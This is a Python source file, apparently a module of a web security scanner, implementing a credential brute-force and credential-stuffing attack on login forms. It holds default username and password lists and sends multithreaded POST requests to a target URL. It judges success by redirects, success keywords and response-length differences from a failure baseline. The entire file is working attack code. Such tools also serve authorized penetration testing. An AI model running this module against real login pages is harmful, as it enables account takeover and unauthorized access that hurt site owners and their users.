"""
modules/auth.py
---------------
Authentication brute-force / credential stuffing module.

Targets login forms with a username/password POST request.
Uses response length comparison and keyword detection to identify success.
"""

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Tuple

from modules.base import BaseModule


DEFAULT_USERNAMES = [
    "admin", "administrator", "root", "user", "guest",
    "test", "demo", "support", "superuser", "info",
]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "password1", "admin123",
    "letmein", "welcome", "monkey", "1234567890", "test",
    "root", "toor", "pass", "12345", "qwerty", "abc123",
    "iloveyou", "dragon", "master", "login",
]

# Keywords that usually indicate successful login
SUCCESS_INDICATORS = [
    "dashboard", "welcome", "logout", "log out", "sign out",
    "profile", "account", "my account", "home", "panel",
]

# Keywords that indicate failed login
FAILURE_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "try again", "bad credentials", "unauthorized",
]


class AuthModule(BaseModule):
    """
    Authentication brute-force module.

    Injects credentials via HTTP POST and analyzes responses to detect success.

    Detection strategy:
    1. Keyword matching for success/failure phrases
    2. Redirect detection (302 after login = often success)
    3. Response length differential vs baseline failure
    """

    def load_payloads(self) -> List[str]:
        """
        Build a credential list as 'username:password' strings.
        """
        if self.config.wordlist:
            raw = self._load_external_wordlist(self.config.wordlist)
            # Expect format: username:password per line
            return [line for line in raw if ":" in line]

        combos = [f"{u}:{p}" for u in DEFAULT_USERNAMES for p in DEFAULT_PASSWORDS]
        return combos

    def execute(self) -> List[Dict[str, Any]]:
        """
        Run credential brute-force against the target URL (POST login).
        """
        credentials = self.load_payloads()
        self.logger.info(f"[+] {len(credentials)} credential combos loaded")
        self.logger.info(f"[*] Target login endpoint: {self.config.url}")

        # Get baseline failure response
        baseline = self._get_failure_baseline()
        if baseline is None:
            self.logger.warning("[!] Could not get baseline response. Proceeding without it.")

        results = []
        pairs = self._parse_credentials(credentials)

        self.logger.info(f"[*] Testing {len(pairs)} username/password combinations...")

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._test_credential, username, password, baseline): (username, password)
                for username, password in pairs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Credentials FOUND: "
                            f"user='{result['payload'].split(':')[0]}' "
                            f"pass='{result['payload'].split(':')[1]}' "
                            f"| {result['evidence']}"
                        )

        return results

    def _get_failure_baseline(self) -> Dict:
        """POST intentionally wrong credentials to get a failure baseline."""
        resp = self.http.post(
            self.config.url,
            data={"username": "invaliduser_x9z", "password": "wrongpassword_x9z"},
        )
        if resp:
            return {
                "status": resp.status_code,
                "length": len(resp.content),
                "body": resp.text.lower(),
            }
        return None

    def _test_credential(self, username: str, password: str, baseline: Dict) -> Dict[str, Any]:
        """POST a credential pair and analyze the result. Delay applied per-worker."""
        if self.config.delay:
            time.sleep(self.config.delay)

        resp = self.http.post(
            self.config.url,
            data={"username": username, "password": password},
        )

        if resp is None:
            return {
                "payload": f"{username}:{password}",
                "param": "username:password",
                "vulnerable": False,
                "evidence": "No response",
                "url": self.config.url,
            }

        return self.analyze_response(resp, f"{username}:{password}", "username:password", baseline)

    def analyze_response(self, response, payload: str, param: str, baseline: Dict = None, **kwargs) -> Dict[str, Any]:
        """
        Detect successful login via:
        - 302 redirect (common login success pattern)
        - Success keywords in body
        - Absence of failure keywords
        - Response length differential
        """
        result = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code,
            "response_length": len(response.content),
            "url": self.config.url,
        }

        body = response.text.lower()

        # Check 1: Redirect without allow_redirects (success signal)
        if response.status_code in (301, 302, 303):
            location = response.headers.get("Location", "")
            if any(kw in location.lower() for kw in ["dashboard", "home", "panel", "account"]):
                result["vulnerable"] = True
                result["evidence"] = f"Redirect to: {location}"
                return result

        # Check 2: Success keyword in body
        for keyword in SUCCESS_INDICATORS:
            if keyword in body:
                result["vulnerable"] = True
                result["evidence"] = f"Success keyword detected: '{keyword}'"
                return result

        # Check 3: No failure keyword + length delta vs baseline
        if baseline:
            has_failure = any(kw in body for kw in FAILURE_INDICATORS)
            length_delta = abs(len(response.content) - baseline["length"])
            if not has_failure and length_delta > 500:
                result["vulnerable"] = True
                result["evidence"] = f"No failure indicators + response length delta {length_delta}"
                return result

        return result

    def _parse_credentials(self, combos: List[str]) -> List[Tuple[str, str]]:
        """Parse 'user:pass' strings into (username, password) tuples."""
        pairs = []
        for combo in combos:
            if ":" in combo:
                parts = combo.split(":", 1)
                pairs.append((parts[0].strip(), parts[1].strip()))
        return pairs
